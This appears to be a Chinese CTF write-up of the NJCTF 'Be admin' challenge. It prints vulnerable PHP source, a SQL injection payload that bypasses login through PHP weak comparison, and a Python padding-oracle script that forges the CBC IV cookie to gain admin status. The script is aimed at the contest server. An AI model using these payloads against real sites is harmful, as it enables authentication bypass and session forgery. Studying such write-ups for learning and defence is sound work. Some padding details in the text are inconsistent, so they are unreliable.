---
title: NJCTF Padding Oracle攻击利用
date: 2017-03-12 15:24:53
categories: CTF
tags:
    - CBC
    - NJCTF
    - Padding Oracle
---

## 简要介绍

刚好最近迷上了Web中的密码学攻击利用，才弄完CBC模式下的比特翻转攻击，不想立马就在CTF中碰见了Padding Oracle攻击，刚好还没学，正好学习一波，还不用自己找环境，源码审计，不用开脑洞~~

<!-- more -->

> 题目: Be admin

{% asset_img desc.png %}

```php
<?php
error_reporting(0);
define("SECRET_KEY", "......");
define("METHOD", "aes-128-cbc");

session_start();

function get_random_token(){
    $random_token='';
    for($i=0;$i<16;$i++){
        $random_token.=chr(rand(1,255));
    }
    return $random_token;
}

function get_identity()
{
    global $defaultId;
    $j = $defaultId;
    $token = get_random_token();    // IV
    $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);
    $_SESSION['id'] = base64_encode($c);
    setcookie("ID", base64_encode($c));
    setcookie("token", base64_encode($token));
    if ($j === 'admin') {
        $_SESSION['isadmin'] = true;
    } else $_SESSION['isadmin'] = false;

}

function test_identity()
{
    if (!isset($_COOKIE["token"]))
        return array();
    if (isset($_SESSION['id'])) {
        $c = base64_decode($_SESSION['id']);
        if ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE["token"]))) {
            if ($u === 'admin') {
                $_SESSION['isadmin'] = true;
            } else $_SESSION['isadmin'] = false;
        } else {
            die("ERROR!");
        }
    }
}

function login($encrypted_pass, $pass)
{
    $encrypted_pass = base64_decode($encrypted_pass);
    $iv = substr($encrypted_pass, 0, 16);
    $cipher = substr($encrypted_pass, 16);
    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    return $password == $pass;
}



function need_login($message = NULL) {
    echo "   <!doctype html>
        <html>
        <head>
        <meta charset=\"UTF-8\">
        <title>Login</title>
        <link rel=\"stylesheet\" href=\"CSS/target.css\">
            <script src=\"https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\"></script>
        </head>
        <body>";
    if (isset($message)) {
        echo "  <div>" . $message . "</div>\n";
    }
    echo "<form method=\"POST\" action=''>
            <div class=\"body\"></div>
		        <div class=\"grad\"></div>
		            <div class=\"header\">
			            <div>Log<span>In</span></div>
		            </div>
		            <br>
		            <div class=\"login\">
                        <input type=\"text\" placeholder=\"username\" name=\"username\">
                        <input type=\"password\" placeholder=\"password\" name=\"password\">               
                        <input type=\"submit\" value=\"Login\">
                    </div>
                     <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
            </form>
        </body>
    </html>";
}

function show_homepage() {
    echo "<!doctype html>
<html>
<head><title>Login</title></head>
<body>";
    global $flag;
    printf("Hello ~~~ ctfer! ");
    if ($_SESSION["isadmin"])
        echo $flag;
    echo "<div><a href=\"logout.php\">Log out</a></div>
</body>
</html>";

}

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = (string)$_POST['username'];
    $password = (string)$_POST['password'];
    $query = "SELECT username, encrypted_pass from users WHERE username='$username'";
    $res = $conn->query($query) or trigger_error($conn->error . "[$query]");
    if ($row = $res->fetch_assoc()) {
        $uname = $row['username'];
        $encrypted_pass = $row["encrypted_pass"];
    }

    if ($row && login($encrypted_pass, $password)) {
        echo "you are in!" . "</br>";
        get_identity();
        show_homepage();
    } else {
        echo "<script>alert('login failed!');</script>";
        need_login("Login Failed!");
    }

} else {
    test_identity();
    if (isset($_SESSION["id"])) {
        show_homepage();
    } else {
        need_login();
    }
}
```

大致阅读下代码，可以看出程序逻辑，首先要通过用户认证，也就是说要登录成功，服务端会设置`$_SESSION["id"]`, 这是后续Padding Oracle攻击的基础；
`$_SESSION["id"]`是`aes-128-cbc`加密后的密文，我们能获取初始向量IV,也就是`Cookie['token']`, 通过Padding Oracle攻击伪造IV使得解出来的明文为`admin`即可。

## SQL注入+弱类型比较绕过登录

查看程序代码，用户认证是通过比较`$password` == `$pass`是否相等，`$pass` 是用户输入的密码，用户可控；而`$password` 是经AES解密后的值， 而密文`$encrypted_pass`是从数据库中查询出来的，存在SQL注入，用户可控，然而由于不知道秘钥，也就无法控制解密后的明文。

```php
function login($encrypted_pass, $pass)
{
    $encrypted_pass = base64_decode($encrypted_pass);
    $iv = substr($encrypted_pass, 0, 16);
    $cipher = substr($encrypted_pass, 16);
    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    return $password == $pass;
}
```

查询`openssl_decrypt`函数，其返回结果解释如下：

```
The decrypted string on success or FALSE on failure
```

解密成功返回解密字符串， 失败则返回`false`, 如果我们令解密失败返回`false`, 那么我们只需要`$pass=''`或`$pass='0'`, 即可利用弱类型比较通过用户认证。要让解密失败，只需令密文长度不满足分组长度要求即可。

payload如下：

```
username=-1' union select 1,1 %23
password=0
```

获取Cookie:

* `token=fxAXU2%2Fzw6PmPMm1TkAgRg%3D%3D`
* `ID=56mJDsCs%2BQQf%2B44j1et%2BrQ%3D%3D`

```
Set-Cookie: ID=56mJDsCs%2BQQf%2B44j1et%2BrQ%3D%3D
Set-Cookie: token=fxAXU2%2Fzw6PmPMm1TkAgRg%3D%3D
Content-Length: 155

you are in!</br><!doctype html>
<html>
<head><title>Login</title></head>
<body>Hello ~~~ ctfer! <div><a href="logout.php">Log out</a></div>
</body>
</html>
```

## Padding Oracle攻击位置cookie

认证成功过后，就是利用Padding Oracle攻击获取`$_SESSION["id"]`解密后的中间值value, 然后伪造IV, 使得 `IV XOR value = 'admin' + string(0x11）* 11`, 即可。

```python
# -*- coding: utf-8 -*-

import sys
import string
import base64
import requests


def str_xor(a, b):
    return ''.join([chr(ord(i) ^ ord(j)) for i, j in zip(a, b)])


base_url = "http://218.2.197.235:23737/index.php"

cookies = {
    'token': '',
    'PHPSESSID': '9uq1qjbeunb085pacngnmhupp3'
}

tmp_iv = '0' * 16
tmp_ivs = list(tmp_iv)

# 中间值 [123, 216, 172, 195, 38, 202, 124, 77, 207, 192, 18, 77, 136, 98, 31]
value = []

# 只能破解出value后15个字符
for flag in range(1, 16):
    for i in range(256):
        # brute
        tmp_ivs[15-len(value)] = chr(i)
        cookies['token'] = base64.b64encode(''.join(tmp_ivs))
        resp = requests.get(base_url, cookies=cookies,
                            proxies={'http': 'http://127.0.0.1:8080'})
        if 'ERROR' not in resp.content:
            value.append(flag ^ i)
            # 更改初始向量
            tmp_iv = '0' * (16-len(value)) + ''.join(chr(value[i] ^ (flag+1))
                                        for i in range(len(value)-1, -1, -1))
            tmp_ivs = list(tmp_iv)

            print flag, i, value
            break
        if i == 255:
            print resp.content
            print 'error'
            sys.exit(0)

# 逆序
value.reverse()

fake_id = 'admin' + chr(11) * 11
for i in range(256):
    # 爆破value 第一个字符
    value = chr(i) + ''.join(chr(v) for v in value)
    iv = str_xor(value, fake_id)
    cookies['token'] = base64.b64encode(iv)
    resp = requests.get(base_url, cookies=cookies)
    if 'ERROR' not in resp.content and len(resp.content) > 139:
        print value
        print resp.content
```

## 后记

openssl_encrypt() 函数 options参数为`OPENSSL_RAW_DATA`, 使用的是`PKCS7`填充模式
